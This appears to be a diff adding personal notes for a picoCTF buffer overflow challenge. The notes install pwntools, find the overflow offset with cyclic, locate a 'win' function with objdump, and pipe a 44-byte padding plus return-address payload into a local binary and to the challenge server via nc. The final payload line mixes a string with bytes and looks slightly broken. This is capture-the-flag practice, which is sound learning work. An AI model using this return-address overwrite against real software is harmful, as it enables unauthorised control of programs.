@@ -1,0 +1,24 @@
+#Req for pwntools
+apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
+apt install python3-pip
+pip install pwntools
+
+#Get number of chars needed for buffer overflow
+cyclic 100 | ./vuln
+cyclic -l 0x6161616c
+
+#Find address of win function
+objdump -t vuln | grep win
+080491f6 g     F .text  0000008b              win
+
+
+#Shellcode
+python3
+>>> from pwn import *
+>>> p32(0x080491f6)
+b'\xf6\x91\x04\x08'
+
+
+python -c "print('A'*44 + b'\xf6\x91\x04\x08')" | ./vuln
+
+python -c "print('A'*44 + b'\xf6\x91\x04\x08')" | nc saturn.picoctf.net 59080
